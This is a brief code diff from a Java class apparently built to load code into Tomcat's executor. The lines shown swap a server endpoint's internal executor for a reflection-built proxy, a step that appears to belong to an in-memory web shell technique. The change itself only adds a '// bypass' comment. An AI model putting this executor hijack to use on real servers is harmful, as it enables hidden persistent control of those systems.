@@ -74,8 +74,8 @@ public class TomcatExecutorThreadLoader {
 
         Object resultObject = Proxy.newProxyInstance(TomcatExecutorThreadLoader.class.getClassLoader(), new Class[]{Executor.class},(InvocationHandler) javaObject);
 
-
 //        invokeMethod(Class.forName("org.apache.tomcat.util.net.AbstractEndpoint"), nioEndpoint, "setExecutor", new Class[]{Executor.class}, new Object[]{resultObject});
+        // bypass
         setFieldValue(nioEndpoint, "executor", resultObject);
         setFieldValue(nioEndpoint, "internalExecutor", false);
     }
